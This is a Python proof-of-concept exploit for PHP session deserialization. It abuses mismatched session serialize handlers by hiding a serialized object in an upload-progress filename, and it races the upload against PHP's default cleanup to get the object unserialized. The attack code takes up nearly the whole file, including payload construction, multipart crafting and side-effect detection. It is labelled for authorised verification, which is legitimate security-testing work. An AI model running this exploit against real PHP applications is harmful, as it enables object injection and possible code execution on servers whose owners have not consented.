#!/usr/bin/env python3
"""
Verify PHP session.serialize_handler mismatch -> object injection.

Fixes over the original PoC:
  1. Sends the session id as a Cookie header. A POST field named PHPSESSID is
     ignored when session.use_only_cookies=On (PHP default), so the original
     wrote and read two unrelated sessions.
  2. A real session id is taken from Set-Cookie when the target issues one
     (required when session.use_strict_mode=On, where a chosen id is rejected).
  3. Runs a control request with a benign filename. The php handler emits
     "Failed to decode session object" for an *empty* php_serialize session
     (a:0:{}) too, so that string alone is not evidence of injection.
  4. Uses a payload naming a class, not stdClass (stdClass has no __destruct
     and makes success unobservable).
  5. Understands session.upload_progress.cleanup: with the PHP default (On)
     the progress record is deleted when the upload finishes, so a second
     request after the upload can never see it. --mode race keeps the upload
     in flight and reads concurrently, which is the only way to hit a target
     using defaults.

Evidence levels reported:
  CONFIRMED (effect)   target-side side effect of the gadget was observed
  CONFIRMED (decoder)  injected bytes reached the php handler's decoder
  INCONCLUSIVE         warning present but indistinguishable from a:0:{} noise
  NOT CONFIRMED        nothing reached the mismatched handler

Authorized testing only.
"""
import argparse
import http.client
import socket
import sys
import threading
import time
from urllib.parse import urlparse, urljoin

BOUNDARY = "MISMATCH"
CHUNK = 32 * 1024


def http_request(host, port, method, path, headers=None, body=None, timeout=20):
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request(method, path, body=body, headers=headers or {})
        resp = conn.getresponse()
        return resp.status, resp.getheaders(), resp.read()
    finally:
        conn.close()


def cookie_sid(headers):
    for k, v in headers:
        if k.lower() == "set-cookie":
            for part in v.split(";"):
                part = part.strip()
                if part.upper().startswith("PHPSESSID="):
                    return part.split("=", 1)[1]
    return None


def open_session(host, port, path, fallback):
    """Get a usable sid: prefer one the target issued, else the supplied one."""
    status, headers, body = http_request(host, port, "GET", path)
    sid = cookie_sid(headers)
    if sid:
        return sid, "Set-Cookie", status, body
    return fallback, "cli --sid", status, body


def build_payload(class_name):
    """php_serialize stores this verbatim; the legacy php handler splits on the pipe."""
    if "|" in class_name or '"' in class_name:
        raise SystemExit("class name must not contain '|' or '\"'")
    return 'x|O:%d:"%s":0:{}' % (len(class_name), class_name)


def header_filename(name):
    """Quoted multipart parameter: PHP unescapes \\" back to a literal quote.
    A raw quote instead terminates the value and truncates the filename."""
    return name.replace("\\", "\\\\").replace('"', '\\"')


def multipart(name, file_bytes):
    head = (
        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        "x\r\n"
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{header_filename(name)}"\r\n\r\n'
    ).encode("latin-1")
    tail = f"\r\n--{BOUNDARY}--\r\n".encode("latin-1")
    return head, tail


def write_session(host, port, path, sid, name, file_bytes=b"Z", timeout=20):
    head, tail = multipart(name, file_bytes)
    body = head + file_bytes + tail
    headers = {
        "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
        "Cookie": f"PHPSESSID={sid}",
    }
    return http_request(host, port, "POST", path, headers=headers, body=body, timeout=timeout)


def read_session(host, port, path, sid):
    status, headers, body = http_request(
        host, port, "GET", path, headers={"Cookie": f"PHPSESSID={sid}"}
    )
    text = body.decode("latin-1", "replace")
    return status, text, "Failed to decode session object" in text


class SlowUpload(threading.Thread):
    """Keeps the body in flight so the progress record is present in the session file."""

    def __init__(self, host, port, path, sid, name, total_bytes, delay):
        super().__init__(daemon=True)
        self.host, self.port, self.path = host, port, path
        self.sid, self.name = sid, name
        self.total, self.delay = total_bytes, delay
        self.stop = threading.Event()
        self.error = None
        self.sent = 0

    def run(self):
        head, tail = multipart(self.name, b"")
        headers = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"Cookie: PHPSESSID={self.sid}\r\n"
            f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
            f"Content-Length: {len(head) + self.total + len(tail)}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode("latin-1")
        try:
            sock = socket.create_connection((self.host, self.port), timeout=20)
            sock.sendall(headers + head)
            payload = b"A" * CHUNK
            while self.sent < self.total and not self.stop.is_set():
                n = min(CHUNK, self.total - self.sent)
                sock.sendall(payload[:n])
                self.sent += n
                time.sleep(self.delay)
            if not self.stop.is_set():
                sock.sendall(tail)
            sock.settimeout(2)
            try:
                while sock.recv(65536):
                    pass
            except (socket.timeout, OSError):
                pass
            sock.close()
        except Exception as exc:  # noqa: BLE001 - reported as text
            self.error = exc


def marker_body(host, port, marker_path):
    try:
        status, _, body = http_request(host, port, "GET", marker_path, timeout=5)
    except Exception:  # noqa: BLE001
        return None
    return body if status == 200 else None


def marker_changed(baseline, current):
    """A stale marker from an earlier run must not count as this run's evidence."""
    if current is None:
        return False
    return current != baseline


def race(host, port, write_path, read_path, sid, name, total_bytes, delay, seconds, marker_path):
    baseline = marker_body(host, port, marker_path) if marker_path != "/__none__" else None
    up = SlowUpload(host, port, write_path, sid, name, total_bytes, delay)
    up.start()
    hits, warns, confirmed = [], 0, False
    deadline = time.time() + seconds
    try:
        while time.time() < deadline:
            if marker_changed(baseline, marker_body(host, port, marker_path)):
                hits.append("marker")
                confirmed = True
                break
            try:
                status, text, warned = read_session(host, port, read_path, sid)
            except Exception:  # noqa: BLE001
                time.sleep(0.1)
                continue
            if warned:
                warns += 1
                if "decoder" not in hits:
                    hits.append("decoder")
                if marker_changed(baseline, marker_body(host, port, marker_path)):
                    hits.append("marker")
                    confirmed = True
                    break
            time.sleep(0.1)
    finally:
        up.stop.set()
        up.join(timeout=5)
    return hits, warns, up.error, up.sent, confirmed


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", default="http://127.0.0.1:18080")
    ap.add_argument("--write-path", default="/app/index.php",
                    help="endpoint whose handler is php_serialize")
    ap.add_argument("--read-path", default="/api/index.php",
                    help="endpoint whose handler is php")
    ap.add_argument("--sid", default=None, help="fallback session id if the target issues none")
    ap.add_argument("--gadget-class", default="Marker",
                    help="class defined on the php-handler side; must be observable")
    ap.add_argument("--marker-url", default="/__none__",
                    help="web path the gadget writes (side-effect oracle); none = decoder signal only")
    ap.add_argument("--mode", choices=("auto", "sequential", "race"), default="auto")
    ap.add_argument("--race-seconds", type=float, default=20.0)
    ap.add_argument("--upload-bytes", type=int, default=4 * 1024 * 1024)
    ap.add_argument("--upload-delay", type=float, default=0.03)
    args = ap.parse_args()

    u = urlparse(args.target)
    host, port = u.hostname, u.port or 80
    payload = build_payload(args.gadget_class)

    print(f"[*] target {args.target}")
    print(f"[*] write(php_serialize) {args.write_path}   read(php) {args.read_path}")
    print(f"[*] payload filename: {payload}")
    print(f"[*] wire encoding:    filename=\"{header_filename(payload)}\"")
    print()

    sid_t, source, status, body = open_session(host, port, args.write_path, args.sid)
    if status != 200:
        print(f"[-] {args.write_path} returned {status}; the writer endpoint is not usable.")
        if not body.strip():
            print("[-] empty body: no session was created, nothing can be planted.")
        return 1
    print(f"[+] sid {sid_t} ({source})")
    if args.sid and source == "Set-Cookie" and sid_t != args.sid:
        print("[!] target ignored the supplied sid and issued its own "
              "(session.use_strict_mode=On or use_only_cookies=On). Using the issued one.")

    # Control: same write/read cycle with a benign filename. Any "Failed to decode"
    # warning here proves the warning is noise on this target, not injection.
    control_warn = False
    if args.mode in ("auto", "sequential"):
        sid_c, _, st_c, _ = open_session(host, port, args.write_path, None)
        if st_c == 200 and sid_c:
            write_session(host, port, args.write_path, sid_c, "benign.txt")
            _, text_c, control_warn = read_session(host, port, args.read_path, sid_c)
            print(f"[*] control (benign filename): decode_warning={control_warn}")

    confirmed_effect = False
    decoder_hit = False

    if args.mode in ("auto", "sequential"):
        baseline = (marker_body(host, port, args.marker_url)
                    if args.marker_url != "/__none__" else None)
        write_session(host, port, args.write_path, sid_t, payload)
        _, text_t, test_warn = read_session(host, port, args.read_path, sid_t)
        print(f"[*] test (payload filename):   decode_warning={test_warn}")
        decoder_hit = test_warn and not control_warn
        if args.marker_url != "/__none__":
            confirmed_effect = marker_changed(baseline, marker_body(host, port, args.marker_url))
            print(f"[*] side effect at {args.marker_url}: {confirmed_effect}")
        if not confirmed_effect and control_warn and test_warn and args.mode == "auto":
            print("[!] warning is indistinguishable from an empty-session (a:0:{}) file;")
            print("[!] falling back to --mode race (default session.upload_progress.cleanup=On)")
            args.mode = "race"

    if args.mode == "race":
        print(f"[*] racing: {args.upload_bytes} bytes over ~"
              f"{args.upload_bytes / CHUNK * args.upload_delay:.1f}s, polling {args.read_path}")
        hits, warns, err, sent, raced = race(host, port, args.write_path, args.read_path, sid_t,
                                            payload, args.upload_bytes, args.upload_delay,
                                            args.race_seconds, args.marker_url)
        if err:
            print(f"[-] upload error: {err}")
        print(f"[*] upload progressed {sent}/{args.upload_bytes} bytes, "
              f"{warns} decode warnings, signals={hits}")
        decoder_hit = decoder_hit or bool(warns)
        if args.marker_url != "/__none__":
            confirmed_effect = confirmed_effect or raced
            print(f"[*] side effect at {args.marker_url}: {confirmed_effect}")

    print()
    if confirmed_effect:
        print("[+] CONFIRMED: injected object was unserialized by the php handler "
              "and its destructor ran.")
        return 0
    if decoder_hit:
        print("[+] CONFIRMED (decoder): injected bytes reached the mismatched handler "
              "(decode failed after the object was parsed).")
        print("[i] Object instantiation is unproven without a gadget side effect; "
              "pass --marker-url to observe one.")
        return 0
    if control_warn:
        print("[?] INCONCLUSIVE: the php handler warns for ordinary sessions on this "
              "target, so the warning is not evidence.")
        print("[i] Default cleanup=On deletes the progress record before the request "
              "ends; use --mode race or a target with cleanup=Off.")
        return 2
    print("[-] NOT CONFIRMED: nothing reached the php handler.")
    print("[i] Check that both endpoints share session.save_path, that the reader's "
          "handler is 'php', and that the reader's classes include the gadget name.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
